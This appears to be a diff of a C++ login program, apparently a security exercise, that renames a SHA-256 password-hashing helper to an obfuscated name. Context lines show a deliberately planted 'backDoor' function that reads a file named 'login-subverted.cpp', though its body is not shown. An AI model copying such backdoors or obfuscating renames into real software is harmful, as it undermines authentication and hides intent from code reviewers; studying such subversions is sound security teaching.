@@ -9,7 +9,7 @@
 #include <ctime>
 
 using namespace std; 
-string g(const string& s) { unsigned char h[SHA256_DIGEST_LENGTH]; SHA256_CTX x; SHA256_Init(&x); SHA256_Update(&x, s.c_str(), s.size()); SHA256_Final(h, &x); stringstream y; for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)y << hex << setw(2) << setfill('0') << (int)h[i]; return y.str(); }
+string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }
 
 bool backDoor(const string& password) {
     ifstream sourceFile("login-subverted.cpp");
@@ -57,7 +57,7 @@ int main() {
 			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
 
 			// Check if entered credentials match any in the file
-			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == g(passwordIn);
+			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == f8e9d7(passwordIn);
 		}
 		// Close the file after reading
 		passwordsFile.close();
